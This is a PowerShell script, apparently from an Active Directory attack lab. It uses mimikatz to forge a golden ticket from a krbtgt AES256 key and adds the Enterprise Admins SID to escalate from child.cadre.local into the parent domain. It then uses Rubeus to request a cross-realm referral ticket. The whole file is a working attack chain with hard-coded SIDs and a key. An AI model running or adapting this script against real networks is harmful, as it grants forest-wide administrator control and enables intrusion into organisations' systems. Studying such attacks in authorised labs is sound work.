[CmdletBinding()]
param(
    [string]$ChildSid = 'S-1-5-21-2616196951-1941128886-767624593',
    [string]$EaSid = 'S-1-5-21-277764030-1371232215-1561074416-519',
    [string]$KrbtgtAes = 'd64da42f8e5caeeb725d009b615eb98f4f05b121376ca38c1e1ee9dcb553d9d2'
)
$ErrorActionPreference = "Continue"

$mimi = 'C:\Tools\ADTools\mimikatz.exe'
$rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$ticket = 'C:\Tools\cadre-attack\T102-capture\EA-aes.kirbi'
Remove-Item $ticket -ErrorAction SilentlyContinue

Write-Output '--- mimikatz golden with AES256 key ---'
& $mimi "kerberos::golden /user:Administrator /domain:child.cadre.local /sid:$ChildSid /aes256:$KrbtgtAes /sids:$EaSid /ticket:$ticket" "exit" 2>&1 | ForEach-Object { Write-Output "GOLDEN|$_" }
Write-Output "TICKET_EXISTS $(Test-Path $ticket)"
if (Test-Path $ticket) { Write-Output "TICKET_SIZE $((Get-Item $ticket).Length)" }

if (Test-Path $ticket) {
  Write-Output '--- asktgs cross-realm referral ---'
  & $rubeus asktgs /ticket:$ticket /service:krbtgt/cadre.local /dc:dc02.child.cadre.local 2>&1 | ForEach-Object { Write-Output "REF|$_" }
}
